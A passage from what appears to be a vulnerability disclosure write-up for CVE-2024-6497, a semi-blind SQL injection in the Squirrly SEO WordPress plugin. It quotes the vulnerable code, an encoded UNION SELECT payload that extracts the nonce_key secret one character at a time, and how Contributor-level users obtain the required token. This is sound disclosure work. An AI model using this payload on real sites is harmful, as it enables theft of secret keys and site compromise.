<p>Now, the interesting part. The returned rows are later parsed in a loop that appends values to the result array only if <code>get_permalink</code> function returns non-false value (in other words, when a post with such ID exists in <code>wp_posts</code> table):</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>294</span><span><span>if</span> <span>(</span> <span>untrailingslashit</span><span>(</span> <span>get_permalink</span><span>(</span> <span>$row</span><span>-&gt;</span><span>ID</span> <span>)</span> <span>)</span> <span>&lt;&gt;</span> <span>$url</span> <span>)</span> <span>{</span>
</span></span><span><span>295</span><span>    <span>$inner_links</span><span>[]</span> <span>=</span> <span>get_permalink</span><span>(</span> <span>$row</span><span>-&gt;</span><span>ID</span> <span>);</span>
</span></span><span><span>296</span><span><span>}</span></span></span></code></pre></div>
<p>The result is later sent to the client in JSON response.</p>
<p>This is why I called it a <em>semi</em> Blind SQL Injection. An attacker can only use <code>wp_posts</code> IDs to extract values from the database. It is more complicated than a usual SQL Injection but not impossible. The trick is to get values we’re interested in one char at a time, then shift their byte value to map to the existing post ID. See the example SQL query in which we try to get <code>nonce_key</code> option value:</p>
<div><pre tabindex="0"><code data-lang="sql"><span><span>1</span><span><span>SELECT</span><span>
</span></span></span><span><span>2</span><span><span>    </span><span>ASCII</span><span>(</span><span>SUBSTRING</span><span>(</span><span>option_value</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>))</span><span>-</span><span>97</span><span> </span><span>AS</span><span> </span><span>ID</span><span>
</span></span></span><span><span>3</span><span><span></span><span>FROM</span><span> </span><span>wp_options</span><span>
</span></span></span><span><span>4</span><span><span></span><span>WHERE</span><span> </span><span>option_name</span><span>=</span><span>&#39;nonce_key&#39;</span><span>
</span></span></span></code></pre></div><p>The <code>-97</code> part is a shift value that allows properly mapping the byte value to post ID. In instances with a small number of posts or with post IDs with gaps shifting is necessary. In my test instance, the plugin returned:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>1</span><span><span>{</span>
</span></span><span><span>2</span><span>    <span>&#34;url&#34;</span><span>:</span> <span>&#34;http:\/\/%27)%20UNION%20SELECT%20ASCII(SUBSTRING(option_value,%201,%201))-97%20AS%20ID%20from%20wp_options%20WHERE%20option_name=%27nonce_key%27#&#34;</span><span>,</span>
</span></span><span><span>3</span><span>    <span>&#34;inner_links&#34;</span><span>:</span> <span>[</span><span>&#34;http:\/\/localhost:8080\/?p=19&#34;</span><span>]</span>
</span></span><span><span>4</span><span><span>}</span>
</span></span></code></pre></div><p>This means that the first byte of <code>nonce_key</code> is: <code>t</code> because <code>19 + 97 = 116 = ASCII(t)</code>.</p>
<h3 id="accessing-the-vulnerable-function">Accessing the vulnerable function</h3>
<p>The <code>getData</code> method is executed via <code>/index.php?rest_route=/squirrly/get</code> endpoint which requires a valid token (beginning of <code>getData</code>):</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>253</span><span><span>$token</span> <span>=</span> <span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;token&#39;</span><span>);</span>
</span></span><span><span>254</span><span><span>if</span> <span>(</span><span>$token</span> <span>&lt;&gt;</span> <span>&#39;&#39;</span><span>)</span> <span>{</span>
</span></span><span><span>255</span><span>    <span>$token</span> <span>=</span> <span>sanitize_text_field</span><span>(</span><span>$token</span><span>);</span>
</span></span><span><span>256</span><span><span>}</span>
</span></span><span><span>257</span><span>
</span></span><span><span>258</span><span><span>if</span> <span>(</span><span>!</span><span>$this</span><span>-&gt;</span><span>token</span> <span>||</span> <span>$this</span><span>-&gt;</span><span>token</span> <span>&lt;&gt;</span> <span>$token</span><span>)</span> <span>{</span>
</span></span><span><span>259</span><span>    <span>exit</span><span>(</span><span>wp_json_encode</span><span>(</span><span>array</span><span>(</span><span>&#39;error&#39;</span> <span>=&gt;</span> <span>esc_html__</span><span>(</span><span>&#34;Connection expired. Please try again.&#34;</span><span>,</span> <span>&#39;squirrly-seo&#39;</span><span>))));</span>
</span></span><span><span>260</span><span><span>}</span></span></span></code></pre></div>
<p>However, this token is available to all users with level “Contributor” or higher because it is embedded in the “New Post” view (<code>/wp-admin/post-new.php</code>):</p>
<div><pre tabindex="0"><code data-lang="html"><span><span>1</span><span><span>&lt;</span><span>script</span> <span>id</span><span>=</span><span>&#34;59a0ca9a38-js-extra&#34;</span><span>&gt;</span>
</span></span><span><span>2</span><span><span>var</span> <span>$sq_config</span> <span>=</span> <span>{...</span> <span>&#34;url_token&#34;</span><span>:</span><span>&#34;dc69d467c7150d77a63cdfd97bc24e86&#34;</span> <span>...};</span>
</span></span><span><span>3</span><span><span>var</span> <span>$sq_params</span> <span>=</span> <span>{</span><span>&#34;max_length_title&#34;</span><span>:</span><span>&#34;75&#34;</span><span>,</span><span>&#34;max_length_description&#34;</span><span>:</span><span>&#34;320&#34;</span><span>};</span>
</span></span><span><span>4</span><span><span>&lt;/</span><span>script</span><span>&gt;</span>
</span></span></code></pre></div><p>This vulnerability has been assigned CVE-2024-6497.</p>

		</section></div>
  </body>
</html>
